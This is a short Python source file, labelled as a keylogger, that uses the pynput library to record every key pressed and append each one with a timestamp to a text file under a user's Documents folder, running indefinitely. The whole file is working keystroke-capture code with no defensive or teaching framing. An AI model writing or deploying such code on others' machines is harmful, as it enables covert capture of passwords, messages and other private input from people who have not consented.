#Keylogger in python
import logging 
import time
from pynput import keyboard

logging.basicConfig(
    filename="/home/tanishq/Documents/keylogData/keylog1.txt",
    level=logging.INFO,
    format="%(asctime)s: %(message)s",
)

def on_key_press(key):
    try:
        logging.info(f"\"{key.char}\" pressed")
    except AttributeError:
        logging.info(f"Special key \" {key} \" pressed")
    except Exception as e:
        logging.info(f"Some error occured...:{e}")


listener = keyboard.Listener(
    on_press = on_key_press,
)
listener.start()

while True:
    time.sleep(10)